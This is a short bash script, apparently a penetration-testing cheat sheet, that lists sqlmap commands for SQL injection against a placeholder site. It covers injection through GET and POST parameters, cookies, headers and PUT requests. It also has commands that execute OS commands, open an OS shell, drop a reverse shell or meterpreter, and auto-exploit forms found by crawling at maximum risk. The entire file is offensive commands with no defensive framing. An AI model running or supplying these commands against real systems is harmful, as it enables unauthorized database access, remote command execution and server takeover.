#!/bin/bash

# GET Request Injection
sqlmap -u "http://example.com/?id=*" -p id

# POST Request Injection
sqlmap -u "http://example.com" --data "username=*&password=*"

#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn

# Crawl a website with SQLmap and auto-exploit
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3